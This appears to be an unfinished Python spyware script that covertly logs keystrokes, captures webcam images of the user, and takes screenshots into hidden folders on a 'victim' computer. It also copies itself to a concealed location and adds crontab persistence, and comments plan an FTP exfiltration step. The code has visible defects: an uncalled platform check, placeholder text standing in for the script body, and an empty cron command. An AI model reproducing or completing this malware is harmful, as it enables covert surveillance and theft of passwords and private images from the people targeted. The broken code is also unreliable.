import os
import ftplib
import cv2
import platform
import getpass
import sys
import threading
import pyautogui
import time
import keyboard
from ftplib import FTP
from crontab import CronTab

class listener():
    
    #log keys and if there is an error pass
    def log_keys(self):
        try:
            
            os.chdir('C:\\Drivers\\network\\keylogs')
            x = 1
            while True:
                if (str('logged_text' + str(x)) in str(os.listdir()) + '\\keylogs'):
                    x += 1
                else:
                    #generate the text file for logging keys
                    with open("logged_text" + str(x) + ".txt", 'w+') as file:
                        #while the number of characters is less than 300
                        for x in range(300):
                            file.write(keyboard.read_key())
                            file.write('\n')
                        file.close()
        except:

            pass
    
    #occasional screenshots of the person behind the camera of the computer
    def camera_screenshot(self):
        #not finished yet
        try:
            os.chdir('C:\\Drivers\\network\\face-screenshots')
            x = 1
            while True:
                time.sleep(5)
                if (str('image' + str(x)) in str(os.listdir()) + '\\face-screenshots'):
                    x += 1
                else:
                    camera = cv2.VideoCapture(0)
                    return_value, image = camera.read()
                    if return_value:
                        cv2.imwrite('image' + str(x) + '.png', image)
                    del(camera)
        except:
            pass
                
    
    #screenshots of the screen every .5 seconds
    def computer_screenshot(self):
        #not finished yet
        os.chdir('C:\\Drivers\\network\\computer-screenshots')
        try:
            x = 1
            while True:
                time.sleep(5)
                if ('screenshot' + str(x) in os.listdir() + '\\computer-screenshots'):
                    x += 1
                else:
                    screenshot = pyautogui.screenshot()
                    screenshot.save('screenshot' + str(x) + '.png')
        except:
            pass


try:
    if platform.system == 'Linux':
        #saving a copy of the program in a deep location in the computer
        os.system('touch /opt/client.py')
        os.system('echo (insert entire script here) > /opt/client.py')

        #adding a link to the file that is saved deep in the computer to 
        #the crontab for on reboot
        new_cron = CronTab(user=getpass.getuser())
        job = new_cron.new(command='python ')

    elif platform.system == 'Windows':
        #i am going to start out with doing windows.
        
        #saving a copy of the program in a deep location in the computer
        os.system('type nul > C:\Drivers\network\client.py')
        os.system('type (insert entire script here) > C:\Drivers\network\client.py')

        #change the directory to the network drive
        os.chdir(r'C:\Drivers\network')

        #creating all of the necessary folders for the files to be saved in on the victoms computer
        os.mkdir("computer-screenshots")
        os.mkdir("face-screenshots")
        os.mkdir("keylogs")

        #initialize the listener object
        spy = listener()

        #add the multiprocessing thing here with each function on a different process in the listener class
        spy.camera_screenshot()
        spy.computer_screenshot()
        spy.log_keys()
except:
    #in the except all of the information will be sent from the folders before doinng the sys.exit
    
    
    sys.exit(1)